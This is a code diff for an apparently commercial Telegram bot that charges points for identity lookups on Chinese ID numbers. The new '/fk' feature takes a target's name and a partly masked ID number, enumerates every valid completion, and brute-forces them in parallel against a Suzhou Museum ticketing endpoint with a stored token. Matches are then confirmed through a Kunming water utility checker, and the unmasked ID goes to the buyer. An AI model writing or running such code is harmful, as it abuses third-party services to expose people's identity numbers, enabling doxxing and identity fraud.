@@ -82,7 +82,6 @@ def query_3ys_logic(chat_id, name, id_card, phone, uid):
         save_points()
         
         raw_text = response.text.strip()
-        # 修正：严谨判断，必须包含成功/一致且不包含不一致/失败
         if ("一致" in raw_text or "成功" in raw_text) and "不一致" not in raw_text and "失败" not in raw_text:
             res_status = "三要素核验成功✅"
         else:
@@ -112,7 +111,6 @@ def single_verify_2ys(chat_id, name, id_card, uid):
         save_points()
         
         raw_text = response.text.strip()
-        # 修正：必须包含“一致”且绝不能包含“不一致”
         if "一致" in raw_text and "不一致" not in raw_text:
             status_title = "二要素核验一致✅"
         else:
@@ -132,7 +130,7 @@ def single_verify_2ys(chat_id, name, id_card, uid):
         bot.edit_message_text(f"❌ 请求异常: {str(e)}", chat_id, wait_msg.message_id)
 
 
-# --- 非库相关爆破与核验逻辑 ---
+# --- 原版风格非库爆破与复核逻辑 ---
 def verify_museum(id_num, target_name, headers, url):
     payload = {
         "contactName": target_name,
@@ -184,36 +182,24 @@ class KunmingWaterVerifier:
             return False
 
 def verify_task(id_num, target_name, headers, url):
-    time.sleep(random.uniform(0.1, 0.3))
+    time.sleep(random.uniform(0.1, 0.4))
     res = verify_museum(id_num, target_name, headers, url)
     with list_lock:
         if res:
             success_list.append(id_num)
+            print(f"{target_name} {id_num} 越狱🟢")
+        else:
+            print(f"{target_name} {id_num} 越狱🔴")
+    time.sleep(0.5)
 
 def run_fk_process(chat_id, target_name, card_mask, gender, uid):
     global success_list
     success_list = []
     
-    bot.send_message(chat_id, f"🔍 正在解析证件掩码组合，准备开始非库检索...")
-    
-    char_sets = [list("0123456789")] * 18
-    for i, ch in enumerate(card_mask):
-        if ch != 'x': char_sets[i] = [ch]
-        elif i == 17: char_sets[i] = list("0123456789X")
-        elif i == 16:
-            if gender == "男": char_sets[16] = ["1", "3", "5", "7", "9"]
-            elif gender == "女": char_sets[16] = ["0", "2", "4", "6", "8"]
-
-    valid_ids = ["".join(r) for r in itertools.product(*char_sets) if is_valid_id_data("".join(r))]
-    
-    if not valid_ids:
-        bot.send_message(chat_id, "❌ 证件号掩码组合无效或没有符合条件的有效身份证。")
-        return
-
     museum_url = "https://newticket.szmuseum.com/japi/sw-saas-cloud/customerContact/save"
     auth_token = get_auth_from_file()
     if not auth_token:
-        bot.send_message(chat_id, "❌ 错误: 未找到有效的 token 配置，请联系管理员更新。")
+        bot.send_message(chat_id, "❌ 未找到有效的 token 配置")
         return
 
     headers = {
@@ -225,37 +211,46 @@ def run_fk_process(chat_id, target_name, card_mask, gender, uid):
         "appId": "9eadb789046543df8b229ae99bb6e8ec"
     }
 
-    bot.send_message(chat_id, f"🚀 有效组合共 {len(valid_ids)} 条，正在进行第一轮多线程初筛...")
+    char_sets = [list("0123456789")] * 18
+    for i, ch in enumerate(card_mask):
+        if ch != 'x': char_sets[i] = [ch]
+        elif i == 17: char_sets[i] = list("0123456789X")
+        elif i == 16:
+            if gender == "男": char_sets[16] = ["1", "3", "5", "7", "9"]
+            elif gender == "女": char_sets[16] = ["0", "2", "4", "6", "8"]
+
+    valid_ids = ["".join(r) for r in itertools.product(*char_sets) if is_valid_id_data("".join(r))]
+    
+    if not valid_ids:
+        bot.send_message(chat_id, "❌ 没有符合条件的有效身份证组合。")
+        return
 
     with ThreadPoolExecutor(max_workers=10) as executor:
         executor.map(lambda id_num: verify_task(id_num, target_name, headers, museum_url), valid_ids)
 
-    # 第二轮复核
     if success_list:
-        bot.send_message(chat_id, f"📋 初筛发现 {len(success_list)} 个疑似结果，正在启动二次精准复核...")
         verified_final = None
         water_verifier = KunmingWaterVerifier()
         
         for sid in success_list:
-            time.sleep(1.0)
+            time.sleep(1.2)
             if water_verifier.verify(target_name, sid):
                 verified_final = sid
                 break
         
         if verified_final:
-            result_text = (
+            final_msg = (
                 f"━━━ 一铭平安喜樂 ━━━\n"
                 f"━━━━━━━━━━━━━━\n"
-                f"✅ **非库查询成功**\n"
-                f"<b>姓名:</b> {target_name}\n"
-                f"<b>身份证:</b> <code>{verified_final}</code>\n"
-                f"<b>当前余额:</b> {user_points[uid]:.2f} 积分"
+                f"✅ 匹配到身份证号: {target_name}-{verified_final} 验证成功\n"
+                f"<b>当前余额: {user_points[uid]:.2f} 积分</b>"
             )
-            bot.send_message(chat_id, result_text, parse_mode='HTML')
+            bot.send_message(chat_id, final_msg, parse_mode='HTML')
+            with open("success_log.txt", "w") as f: f.write(verified_final)
         else:
-            bot.send_message(chat_id, "❌ 初选中的号码均未通过终审。")
+            bot.send_message(chat_id, "━━━ 一铭万事顺遂 ━━━\n━━━━━━━━━━━━━━\n❌ 遗憾, 初选中的号码均未通过终审。")
     else:
-        bot.send_message(chat_id, "❌ 检索结束，未发现匹配结果。")
+        bot.send_message(chat_id, "━━━ 一铭万事顺遂 ━━━\n━━━━━━━━━━━━━━\n❌ 核验结束, 未发现匹配结果。")
 
 
 # ================= 3. UI 菜单 =================
@@ -323,13 +318,10 @@ def handle_commands(message):
         card_mask = cmd_parts[2].lower()
         gender = cmd_parts[3]
         
-        # 每次扣除 1 积分
         user_points[uid] -= 1.0
         save_points()
         
-        bot.send_message(chat_id, f"✅ 已扣除 1 积分，当前剩余: {user_points[uid]:.2f} 积分")
-        
-        # 开启线程执行非库爆破
+        bot.send_message(chat_id, f"✅ 已扣除 1 积分，正在后台开始非库检索...")
         threading.Thread(target=run_fk_process, args=(chat_id, target_name, card_mask, gender, uid)).start()
 
     elif cmd == 'settoken':
@@ -363,7 +355,7 @@ def handle_all_text(message):
     if text.startswith('/'): return
     current_pts = user_points.get(uid, 0.0)
     
-    # 兼容直接输入：姓名 身份证掩码 性别（自动触发非库）
+    # 兼容直接输入：姓名 身份证掩码 性别
     parts = text.split()
     if len(parts) == 3 and ('x' in parts[1].lower() or len(parts[1]) == 18):
         if current_pts < 1.0:
@@ -375,8 +367,7 @@ def handle_all_text(message):
         
         user_points[uid] -= 1.0
         save_points()
-        bot.send_message(chat_id, f"✅ 已扣除 1 积分，当前剩余: {user_points[uid]:.2f} 积分")
-        
+        bot.send_message(chat_id, f"✅ 已扣除 1 积分，正在后台开始非库检索...")
         threading.Thread(target=run_fk_process, args=(chat_id, target_name, card_mask, gender, uid)).start()
         return
 
@@ -419,7 +410,7 @@ def handle_callback(call):
     
     try:
         if call.data == "view_help":
-            # 原版帮助文本完全保持不变，仅在下方原样追加了 /fk 非库说明
+            # 使用帮助文字严格保持原样，只在最后一行按要求追加了 /fk 说明
             help_text = (
                 "<b>🛠️ 使用帮助</b>\n"
                 "<b>名字-身份证核验 (企业级)</b>\n"
@@ -432,8 +423,8 @@ def handle_callback(call):
                 "<b>发送 /3ys 进行核验</b>\n"
                 "<b>每次核验扣除 0.05 积分</b>\n"
                 "<b>——————————————————</b>\n"
-                "<b>非库身份证模糊匹配 (新功能)</b>\n"
-                "<b>发送 /fk 姓名 身份证掩码 性别 进行查询</b>\n"
+                "<b>非库身份证模糊匹配</b>\n"
+                "<b>发送 /fk 姓名 身份证掩码 性别</b>\n"
                 "<b>每次查询扣除 1 积分</b>"
             )
             bot.edit_message_text(help_text, chat_id, message_id, reply_markup=get_help_markup(), parse_mode='HTML')
